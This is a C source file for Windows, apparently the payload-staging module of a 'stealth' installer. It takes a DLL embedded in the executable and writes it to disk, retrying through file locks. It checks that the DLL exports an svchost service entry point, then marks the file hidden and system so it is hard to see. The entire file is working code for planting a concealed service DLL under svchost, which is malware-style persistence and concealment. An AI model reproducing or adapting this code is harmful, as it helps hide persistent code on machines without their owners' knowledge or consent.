#include <windows.h>
#include <stdint.h>
#include <string.h>
#include "svchost_payload.h"

#if defined(BUILD_SVCHOST_DLL)

BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
{
    (void)destination;
    SetLastError(ERROR_NOT_SUPPORTED);
    return FALSE;
}

#else

#include <strsafe.h>
#include "stealth.h"

#ifndef IDR_SVCHOST_DLL
#define IDR_SVCHOST_DLL 101
#endif

#define STEALTH_CAPTURE_ENV_VAR L"STEALTH_CAPTURE_FAILED_DLL"
#define STEALTH_SVCHOST_EXPORT_NAME "Stealth_SvchostServiceMain"

static void MeshSvchostPayload_SetHiddenAttributes(const wchar_t* path)
{
    DWORD attrs = GetFileAttributesW(path);
    if (attrs == INVALID_FILE_ATTRIBUTES)
    {
        attrs = 0;
    }
    attrs |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
    SetFileAttributesW(path, attrs);
}

static BOOL MeshSvchostPayload_GetEmbeddedResource(const void** resourceData, DWORD* resourceSize)
{
    HMODULE moduleHandle = NULL;
    HRSRC resourceInfo = NULL;
    HGLOBAL resourceHandle = NULL;
    const void* lockedResource = NULL;
    DWORD lockedSize = 0;
    LPCWSTR resourceType = MAKEINTRESOURCEW(10);

    if (resourceData == NULL || resourceSize == NULL)
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    *resourceData = NULL;
    *resourceSize = 0;

    moduleHandle = GetModuleHandleW(NULL);
    if (moduleHandle == NULL)
    {
        return FALSE;
    }

    resourceInfo = FindResourceW(moduleHandle, MAKEINTRESOURCEW(IDR_SVCHOST_DLL), resourceType);
    if (resourceInfo == NULL)
    {
        return FALSE;
    }

    resourceHandle = LoadResource(moduleHandle, resourceInfo);
    if (resourceHandle == NULL)
    {
        return FALSE;
    }

    lockedResource = LockResource(resourceHandle);
    lockedSize = SizeofResource(moduleHandle, resourceInfo);
    if (lockedResource == NULL || lockedSize == 0)
    {
        SetLastError(ERROR_RESOURCE_DATA_NOT_FOUND);
        return FALSE;
    }

    *resourceData = lockedResource;
    *resourceSize = lockedSize;
    return TRUE;
}

static BOOL MeshSvchostPayload_VerifyFileSize(const wchar_t* path, DWORD expectedSize)
{
    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
    ULARGE_INTEGER actualSize;

    if (path == NULL || path[0] == L'\0')
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    if (!GetFileAttributesExW(path, GetFileExInfoStandard, &fileInfo))
    {
        return FALSE;
    }

    actualSize.LowPart = fileInfo.nFileSizeLow;
    actualSize.HighPart = fileInfo.nFileSizeHigh;
    if (actualSize.QuadPart != (ULONGLONG)expectedSize)
    {
        SetLastError(ERROR_BAD_LENGTH);
        return FALSE;
    }

    return TRUE;
}

static BOOL MeshSvchostPayload_VerifyWrittenDll(const wchar_t* path)
{
    HMODULE moduleHandle = NULL;
    FARPROC serviceMain = NULL;
    DWORD exportError = ERROR_SUCCESS;

    if (path == NULL || path[0] == L'\0')
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    moduleHandle = LoadLibraryExW(path, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (moduleHandle == NULL)
    {
        return FALSE;
    }

    serviceMain = GetProcAddress(moduleHandle, STEALTH_SVCHOST_EXPORT_NAME);
    exportError = (serviceMain != NULL) ? ERROR_SUCCESS : GetLastError();
    FreeLibrary(moduleHandle);

    if (serviceMain == NULL)
    {
        SetLastError(exportError != ERROR_SUCCESS ? exportError : ERROR_PROC_NOT_FOUND);
        return FALSE;
    }

    return TRUE;
}

static void MeshSvchostPayload_TryCaptureFailure(const wchar_t* destination)
{
    if (destination == NULL || destination[0] == L'\0') { return; }

    wchar_t envBuffer[4] = {0};
    if (GetEnvironmentVariableW(STEALTH_CAPTURE_ENV_VAR, envBuffer, _countof(envBuffer)) == 0)
    {
        return;
    }

    wchar_t capturePath[MAX_PATH * 2] = {0};
    SYSTEMTIME st;
    GetLocalTime(&st);
    if (FAILED(StringCchPrintfW(
        capturePath,
        _countof(capturePath),
        L"%s.failed_%04u%02u%02u%02u%02u%02u",
        destination,
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond)))
    {
        return;
    }

    if (CopyFileW(destination, capturePath, FALSE))
    {
        Stealth_LogInstallEvent(L"Captured failed svchost payload snapshot: %ls", capturePath);
    }
}

BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
{
    HANDLE fileHandle = INVALID_HANDLE_VALUE;
    const void* payloadData = NULL;
    DWORD payloadSize = 0;
    DWORD written = 0;
    BOOL writeOk = FALSE;

    if (destination == NULL || destination[0] == L'\0')
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    if (!MeshSvchostPayload_GetEmbeddedResource(&payloadData, &payloadSize))
    {
        Stealth_LogInstallEvent(L"Failed to locate embedded svchost payload resource (error=%lu)", GetLastError());
        return FALSE;
    }

    Stealth_LogInstallEvent(L"Emitting embedded svchost payload resource (%lu bytes) to %ls", payloadSize, destination);

    {
        const DWORD startTick = GetTickCount();
        DWORD delay = 100;
        DWORD lastErr = ERROR_SUCCESS;

        for (;;)
        {
            fileHandle = CreateFileW(
                destination,
                GENERIC_WRITE,
                0,
                NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_HIDDEN,
                NULL);

            if (fileHandle != INVALID_HANDLE_VALUE)
            {
                break;
            }

            lastErr = GetLastError();
            if (lastErr != ERROR_SHARING_VIOLATION &&
                lastErr != ERROR_LOCK_VIOLATION &&
                lastErr != ERROR_ACCESS_DENIED)
            {
                Stealth_LogInstallEvent(L"CreateFile failed for %ls (error=%lu)", destination, lastErr);
                SetLastError(lastErr);
                return FALSE;
            }

            if ((GetTickCount() - startTick) >= 60000)
            {
                Stealth_LogInstallEvent(L"CreateFile timed out for %ls (lastError=%lu)", destination, lastErr);
                SetLastError(lastErr);
                return FALSE;
            }

            Sleep(delay);
            if (delay < 1000) { delay += 100; }
        }
    }

    writeOk = WriteFile(fileHandle, payloadData, payloadSize, &written, NULL);
    if (writeOk)
    {
        FlushFileBuffers(fileHandle);
    }
    {
        DWORD writeErr = writeOk ? ERROR_SUCCESS : GetLastError();
        CloseHandle(fileHandle);
        fileHandle = INVALID_HANDLE_VALUE;

        if (!writeOk || written != payloadSize)
        {
            Stealth_LogInstallEvent(L"WriteFile failed for %ls (bytes=%lu, error=%lu)", destination, written, writeErr);
            DeleteFileW(destination);
            SetLastError(writeErr != ERROR_SUCCESS ? writeErr : ERROR_WRITE_FAULT);
            return FALSE;
        }
    }

    if (!MeshSvchostPayload_VerifyFileSize(destination, payloadSize) ||
        !MeshSvchostPayload_VerifyWrittenDll(destination))
    {
        DWORD verifyErr = GetLastError();
        Stealth_LogInstallEvent(L"Embedded svchost payload verification failed for %ls (error=%lu)", destination, verifyErr);
        Stealth_LogPathState(destination);
        MeshSvchostPayload_TryCaptureFailure(destination);
        DeleteFileW(destination);
        SetLastError(verifyErr);
        return FALSE;
    }

    Stealth_LogInstallEvent(L"Embedded svchost payload staged (%lu bytes) to %ls", payloadSize, destination);
    MeshSvchostPayload_SetHiddenAttributes(destination);
    return TRUE;
}

#endif /* BUILD_SVCHOST_DLL */
